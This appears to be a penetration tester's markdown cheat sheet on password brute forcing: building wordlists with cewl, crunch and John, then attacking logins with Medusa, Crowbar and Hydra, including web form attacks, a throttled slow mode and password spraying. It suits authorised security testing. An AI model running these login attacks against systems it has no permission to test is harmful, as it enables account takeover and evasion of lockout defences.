# Bruteforce

## Generate wordlist

### Local

* **Seclists:** [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

### Cewl

```
cewl <url> -m <min length> -w <file>.txt       #generate from login page
cewl <url> -m <min length> -e -w <file>.txt    #harvest emails
```

### Crunch

```
crunch <min-len> <max-len> -f </path/to/charset>.lst -o <wordlist.txt>
crunch <min-len> <max-len> "<accepted chars>" -o <wordlist.txt> 
crunch <min-len> <max-len> -t <pattern> -o <wordlist.txt> -s <start string>
```

Pattern syntax:

* **@** will insert lower case characters
* **,**   will insert upper case characters
* **%**  will insert numbers
* **^**   will insert symbols

Symbols can be combined with static strings.

When specifying a charset the order MUST be lowercase chars, uppercase chars, numbers and symbols.

## Improve wordlist quality

### John

```
john --wordlist=<file>.txt --rules=Wordlist --stdout > <file>.txt
```

## Bruteforce

### Medusa

```
medusa -h <target ip> -u <target username> -P <path to wordlist> -M <mode> -m DIR:/<page>
```

### Crowbar

```
crowbar -b <protocol> -s <target ip> -u <target user> -C <path to wordlist>.txt -n <threads>
```

### Hydra

```
hydra -vV -l <user> -P <path to wordlist>.txt <protocol>://<ip> -s <port> -e sn -t 8
hydra -vV -l <user> -P <path to wordlist>.txt <protocol>://<ip> -s <port> -o <file>.txt
hydra -vV -L <userlist>.txt -P <path to wordlist>.txt <protocol>://<ip> -s <port>
```

#### Post form

```
hydra <ip> -s <port> http-form-post "<relative form url>:<user form field>=^USER^&<password form field>=^PASS^:F=<invalid login string>" -L <file>.txt -P <file>.txt -vV -f
hydra <ip> -s <port> http-form-post "<relative form url>:<user form field>=<username>&<password form field>=^PASS^:F=<invalid login string>" -l <username> -P <file>.txt -vV -f
```

Slow mode

```
hydra <ip> -s <port> http-form-post "<relative form url>:<user form field>=<username>&<password form field>=^PASS^:F=<invalid login string>" -l <username> -P <file>.txt -vV -f -t 2 -W 5
```

#### Password spraying

```
hydra -l <user> -P <path to wordlist>.txt -M <hostfile>.txt <protocol> -vV -F
```

#### On SSL

```
hydra -vV -l <user> -S -P <path to wordlist>.txt <protocol>://<ip> -s <port>
```

#### Generate passwords

```
hydra -vV -l <user> -x<min>:<max>:<charset> <protocol>://<ip> -s <port>
hydra -vV -l <user> -x4:8:Aa1 -y <protocol>://<url>    #generate alphanumeric passwords
```

Charset rules (to be used with `-y` option) :

* **A** stands for A-Z
* **a** stands for a-z
* **1** stands for 0-9
* for symbols append them to the charset i.e. `a1/.` will generate passwords with alphanumeric lowercase characters plus dot and dash

#### Modules

```
hydra -h
hydra <module> -U | less
hydra <ip> <module> <additional args> -l <target user> -P <filelist>.txt -vV -f
```





